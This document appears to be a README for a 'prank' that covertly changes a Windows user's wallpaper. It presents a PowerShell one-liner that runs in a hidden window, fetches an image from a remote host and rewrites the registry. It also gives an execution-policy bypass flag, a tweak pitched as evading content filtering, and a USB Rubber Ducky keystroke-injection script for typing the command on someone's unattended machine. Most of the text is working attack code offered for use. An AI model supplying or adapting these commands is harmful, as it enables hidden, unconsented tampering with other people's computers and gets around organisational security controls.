# PowerShell Wallpaper Prank
PowerShell command to change wallpaper on Windows 10 from the run command all less than 260 characters

Improving on the Hak5 video One Line PowerShell Wallpaper Prank - Hak5 2502

[![One Line PowerShell Wallpaper Prank - Hak5 2502](https://img.youtube.com/vi/f3C58OKOsuo/0.jpg)](https://www.youtube.com/watch?v=f3C58OKOsuo)

The original code which is 253 characters
```
cmd /C "start /MIN powershell iwr -Uri http://h4k.cc/b.jpg -OutFile c:\windows\temp\b.jpg;sp 'HKCU:Control Panel\Desktop' WallPaper 'c:\windows\temp\b.jpg';$a=1;do{RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters ,1 ,True;sleep 1}while($a++-le59)"
```

The following can be run in the windows Run dialog which has the 260 character limit and will replace the user's desktop background with an image of your choice. Reduced to 233 characters.

```
powershell -w h -c "$a=$ENV:TMP+$([guid]::NewGuid())+'.jpg';iwr -Uri http://h4k.cc/b.jpg -OutFile $($a);sp 'HKCU:Control Panel\Desktop' WallPaper $($a);1..60|%{RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters ,1 ,True;sleep 1}"
```

Broken down this does the following:
```powershell -w h -c ```
launch a hidden powershell window and run a command, note this can be changed to the following can be added to bypass the execution policy powershell restriction you find in most enterprises, but this adds 12 characters if this is needed.

```powershell -ep bypass -w h -c```

The next secion creates a variable of a file in the user temp directory with a random GUID name.

```$a=$ENV:TMP+$([guid]::NewGuid())+'.jpg';```

The next secion downloads the image from the remote site using an alias of ```Invoke-WebRequest``` and stores it in the temp location you just declared

```iwr -Uri http://h4k.cc/b.jpg -OutFile $($a);```

Then set the Registry wallpaper item property using the ```sp``` alias of ```Set-ItemProperty``` to the wallpaper

```sp 'HKCU:Control Panel\Desktop' WallPaper $($a);```

Finally, the command ```RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters ,1 ,True;``` will update the desktop on the user's screen, but it is not reliable and needs to be triggered multiple times so it is wrapped in a 60 second loop.

```1..60|%{RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters ,1 ,True;sleep 1}```

### Improvement allowing HTTPS URLs
Currently this does not allow locations which are serving images over https which would bypass some content filtering systems due to a

```iwr : The request was aborted: Could not create SSL/TLS secure channel.```

error, this can be fixed by running the following command prior to executing the rest

```
[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12
```
but this is an extra 78 characters which would put it over the 260 character limit.

After a bit of investigation I found the following pieces of information
* ```[Net.ServicePointManager]::SecurityProtocol``` is an enum so it can be declared as a string "tls12"
* The url for iwr -Uri does not require the protocol  so that can be stripped out saving 7 characters (or 8 characters in a https url).

This still makes the command too long (283 characters), but that is very close to what we need, so if you are willing to sacrifice the random name.

```
powershell -w h -c "[Net.ServicePointManager]::SecurityProtocol='tls12';$a=$ENV:TMP+'a.jpg';iwr -Uri h4k.cc/b.jpg -OutFile $($a);sp 'HKCU:Control Panel\Desktop' WallPaper $($a);1..60|%{RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters ,1 ,True;sleep 1}"
```

it drops to 258 characters.

```
WWWWWWWW                           WWWWWWWWIIIIIIIIIINNNNNNNN        NNNNNNNN      !!! 
W::::::W                           W::::::WI::::::::IN:::::::N       N::::::N     !!:!!
W::::::W                           W::::::WI::::::::IN::::::::N      N::::::N     !:::!
W::::::W                           W::::::WII::::::IIN:::::::::N     N::::::N     !:::!
 W:::::W           WWWWW           W:::::W   I::::I  N::::::::::N    N::::::N     !:::!
  W:::::W         W:::::W         W:::::W    I::::I  N:::::::::::N   N::::::N     !:::!
   W:::::W       W:::::::W       W:::::W     I::::I  N:::::::N::::N  N::::::N     !:::!
    W:::::W     W:::::::::W     W:::::W      I::::I  N::::::N N::::N N::::::N     !:::!
     W:::::W   W:::::W:::::W   W:::::W       I::::I  N::::::N  N::::N:::::::N     !:::!
      W:::::W W:::::W W:::::W W:::::W        I::::I  N::::::N   N:::::::::::N     !:::!
       W:::::W:::::W   W:::::W:::::W         I::::I  N::::::N    N::::::::::N     !!:!!
        W:::::::::W     W:::::::::W          I::::I  N::::::N     N:::::::::N      !!! 
         W:::::::W       W:::::::W         II::::::IIN::::::N      N::::::::N          
          W:::::W         W:::::W          I::::::::IN::::::N       N:::::::N      !!! 
           W:::W           W:::W           I::::::::IN::::::N        N::::::N     !!:!!
            WWW             WWW            IIIIIIIIIINNNNNNNN         NNNNNNN      !!! 
```

### Other Notes

I am aware that I could make this a 2 stage payload or load the script externally, but as many organizations protect against remote PowerShell scripts and I want this to execute entirely within the Run dialog,

```
      _      _      _      USB       _      _      _
   __(.)< __(.)> __(.)=   Rubber   >(.)__ <(.)__ =(.)__
   \___)  \___)  \___)    Ducky!    (___/  (___/  (___/ 
```

This could very easily not be transformed into a [USB Rubber Ducky script](https://github.com/hak5darren/USB-Rubber-Ducky)

```
DELAY 3000
GUI r
DELAY 300
STRING powershell -w h -c "[Net.ServicePointManager]::SecurityProtocol='tls12';$a=$ENV:TMP+'a.jpg';iwr -Uri h4k.cc/b.jpg -OutFile $($a);sp 'HKCU:Control Panel\Desktop' WallPaper $($a);1..60|%{RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters ,1 ,True;sleep 1}"
ENTER 
```
